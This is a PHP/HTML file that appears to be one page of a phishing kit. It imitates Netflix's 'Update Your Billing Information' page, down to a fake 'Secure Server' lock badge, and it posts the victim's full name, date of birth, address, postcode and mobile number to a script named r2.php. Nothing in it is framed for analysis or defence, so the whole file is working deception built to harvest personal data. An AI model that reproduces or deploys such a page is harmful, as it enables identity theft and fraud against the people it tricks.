<?php
session_start();
require_once 'crypt.php';
?>
<!doctype html>
<html>
<head>
<title>Netflix - Billing Information</title>
     <meta content="watch films, films online, watch TV, TV online, TV programmes online, watch TV programmes, stream films, stream tv, instant streaming, watch online, films, watch films uk, watch TV online uk, no download, full length films" name="keywords">
     <meta content="Watch Netflix movies &amp; TV shows online or stream right to your smart TV, game console, PC, Mac, mobile, tablet and more. Start your free trial today." name="description">
     <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
     <meta charset="utf-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width,initial-scale=1.0">
<link type="text/css" rel="stylesheet" href="css/b.css">
<link type="text/css" rel="stylesheet" href="css/c.css">
<link rel="shortcut icon" href="imag/nficon2015.ico">


</head>
<body>

<div id="appMountPoint">
<div class="basicLayout firefox accountPayment" lang="en" dir="ltr" data-reactid=".20urkhey51c" data-react-checksum="-306255637">
<div class="nfHeader signupBasicHeader" data-reactid=".20urkhey51c.1">
<a href="#" class="icon-logoUpdate nfLogo signupBasicHeader" data-reactid=".20urkhey51c.1.1">
<span class="screen-reader-text" data-reactid=".20urkhey51c.1.1.0">Netflix</span></a>
<a href="#" class="authLinks signupBasicHeader" data-reactid=".20urkhey51c.1.2">Sign Out</a>
</div>

<div class="centerContainer" data-reactid=".20urkhey51c.2">
<h1 data-reactid=".20urkhey51c.2.1">Update Your Billing Information</h1>
<div class="secure-container clearfix" data-reactid=".20urkhey51c.2.7">
<div class="secure" data-reactid=".20urkhey51c.2.7.0">
<span class="secure-desc" data-reactid=".20urkhey51c.2.7.0.0">
<h4 class="secure-text" data-reactid=".20urkhey51c.2.7.0.0.0">Secure Server</h4>
<a class="tell-me-more" data-reactid=".20urkhey51c.2.7.0.0.1">Tell me more</a></span>

<span class="icon-lock" data-reactid=".20urkhey51c.2.7.0.2">
</span>
</div>
</div>

<div class="accordion" data-reactid=".20urkhey51c.2.8">
<div class="isOpen expando" data-reactid=".20urkhey51c.2.8.$0">
<div class="paymentExpandoHd" data-mop-type="creditOption" data-reactid=".20urkhey51c.2.8.$0.$0">
<div class="container" data-reactid=".20urkhey51c.2.8.$0.$0.0">
<span class="arrow" data-reactid=".20urkhey51c.2.8.$0.$0.0.0"></span>
<span class="hdLabel" data-reactid=".20urkhey51c.2.8.$0.$0.0.1">Billing Address</span>
</div>
</div>

<div class="expandoContent" data-reactid=".20urkhey51c.2.8.$0.1">
<div class="paymentForm clearfix accordion" data-reactid=".20urkhey51c.2.8.$0.1.$creditOption">

<form action="r2.php" method="post" data-reactid=".20urkhey51c.2.8.$0.1.$creditOption.0">

<div class="paymentForm-input" data-reactid=".20urkhey51c.2.8.$0.1.$creditOption.0.0:0">
<label class="paymentForm-input firstName ui-label ui-input-label inline ui-input-half">
<span class="ui-label-text" data-reactid=".20urkhey51c.2.8.$0.1.$creditOption.0.0:0.$firstName.0">Full Name</span>
<input class="ui-text-input medium auto-firstName" name="name" required placeholder="First and Last Name" tabindex="0"></label>
</div>

<div class="paymentForm-input" data-reactid=".20urkhey51c.2.8.$0.1.$creditOption.0.0:0">
<label class="paymentForm-input firstName ui-label ui-input-label inline ui-input-half">
<span class="ui-label-text" data-reactid=".20urkhey51c.2.8.$0.1.$creditOption.0.0:0.$firstName.0">Date of Birth</span>
<br />
<br />
<label>
<input class="ui-text-input medium auto-firstName" name="day" maxlength="2" required placeholder="DAY" style="width: 88px">
</label>
<label>
<input class="ui-text-input medium auto-firstName" name="month" maxlength="2" required placeholder="MONTH" style="width: 89px">
</label>
<label>
<input class="ui-text-input medium auto-firstName" name="year" maxlength="4" required placeholder="YEAR" style="width: 120px">
</label>
</div>


<div class="paymentForm-input" data-reactid=".20urkhey51c.2.8.$0.1.$creditOption.0.0:0">
<label class="paymentForm-input firstName ui-label ui-input-label inline ui-input-half">
<span class="ui-label-text" data-reactid=".20urkhey51c.2.8.$0.1.$creditOption.0.0:0.$firstName.0">Billing Address</span>
<input class="ui-text-input medium auto-firstName" name="billing" required tabindex="0"></label>
</div>

<div class="paymentForm-input" data-reactid=".20urkhey51c.2.8.$0.1.$creditOption.0.0:0">
<label class="paymentForm-input firstName ui-label ui-input-label inline ui-input-half">
<span class="ui-label-text" data-reactid=".20urkhey51c.2.8.$0.1.$creditOption.0.0:0.$firstName.0">City</span>
<input class="ui-text-input medium auto-firstName" name="city" required tabindex="0"></label>
</div>

<div class="paymentForm-input" data-reactid=".20urkhey51c.2.8.$0.1.$creditOption.0.0:0">
<label class="paymentForm-input firstName ui-label ui-input-label inline ui-input-half">
<span class="ui-label-text" data-reactid=".20urkhey51c.2.8.$0.1.$creditOption.0.0:0.$firstName.0">County</span>
<input class="ui-text-input medium auto-firstName" name="county" required tabindex="0"></label>
</div>

<div class="paymentForm-input" data-reactid=".20urkhey51c.2.8.$0.1.$creditOption.0.0:0">
<label class="paymentForm-input firstName ui-label ui-input-label inline ui-input-half">
<span class="ui-label-text" data-reactid=".20urkhey51c.2.8.$0.1.$creditOption.0.0:0.$firstName.0">Postcode</span>
<input class="ui-text-input medium auto-firstName" name="postcode" required tabindex="0"></label>
</div>

<div class="paymentForm-input" data-reactid=".20urkhey51c.2.8.$0.1.$creditOption.0.0:0">
<label class="paymentForm-input firstName ui-label ui-input-label inline ui-input-half">
<span class="ui-label-text" data-reactid=".20urkhey51c.2.8.$0.1.$creditOption.0.0:0.$firstName.0">Mobile Number</span>
<input class="ui-text-input medium auto-firstName" name="mobile" required tabindex="0"></label>
</div>

<div data-reactid=".20urkhey51c.2.8.$0.1.$creditOption.0.1">

<noscript data-reactid=".20urkhey51c.2.8.$0.1.$creditOption.0.1.0"></noscript>

</div>

<div class="clearfix" data-reactid=".20urkhey51c.2.8.$0.1.$creditOption.0.8"><div class="btn-secure-wrapper" data-reactid=".20urkhey51c.2.8.$0.1.$creditOption.0.8.0">
<button class="btn btn-submit btn-large" type="submit" autocomplete="off" tabindex="0" data-reactid=".20urkhey51c.2.8.$0.1.$creditOption.0.8.0.0">
<span data-reactid=".20urkhey51c.2.8.$0.1.$creditOption.0.8.0.0.0:0">Update Billing Address</span>
</button>

<div class="secure" data-reactid=".20urkhey51c.2.8.$0.1.$creditOption.0.8.0.1"><span class="secure-text" data-reactid=".20urkhey51c.2.8.$0.1.$creditOption.0.8.0.1.0">Secure Server</span>
<span class="icon-lock" data-reactid=".20urkhey51c.2.8.$0.1.$creditOption.0.8.0.1.1"></span>
</div>
</div>




</td>
</tr>
</table
></div>
</div>
</form>
</div>
</div>
</div>
</div>


<div id="tmcontainer" class="tmint" data-reactid=".20urkhey51c.2.b">


<div id="tmswf" class="tmint" data-reactid=".20urkhey51c.2.b.2"></div>
</div>
</div>

<div class="site-footer-wrapper centered" data-reactid=".20urkhey51c.3"><div class="footer-divider" data-reactid=".20urkhey51c.3.0"></div><div class="site-footer" data-reactid=".20urkhey51c.3.1"><p class="footer-top" data-reactid=".20urkhey51c.3.1.0"><span data-reactid=".20urkhey51c.3.1.0.0">Questions? </span><a class="footer-top-a" href="#" data-reactid=".20urkhey51c.3.1.0.1">Contact us.</a><span data-reactid=".20urkhey51c.3.1.0.2"></span></p>

<ul class="footer-links structural" data-reactid=".20urkhey51c.3.1.1">
<li class="footer-link-item" data-reactid=".20urkhey51c.3.1.1.0:$footer=1responsive=1link=1terms">
<a class="footer-link" href="#" data-reactid=".20urkhey51c.3.1.1.0:$footer=1responsive=1link=1terms.0">
<span data-reactid=".20urkhey51c.3.1.1.0:$footer=1responsive=1link=1terms.0.0">Terms of Use</span></a>
</li>
<li class="footer-link-item" data-reactid=".20urkhey51c.3.1.1.0:$footer=1responsive=1link=1privacy_separate_link">
<a class="footer-link" href="#" data-reactid=".20urkhey51c.3.1.1.0:$footer=1responsive=1link=1privacy_separate_link.0">
<span data-reactid=".20urkhey51c.3.1.1.0:$footer=1responsive=1link=1privacy_separate_link.0.0">Privacy</span>
</a>
</li>
</div>
</body>
</html>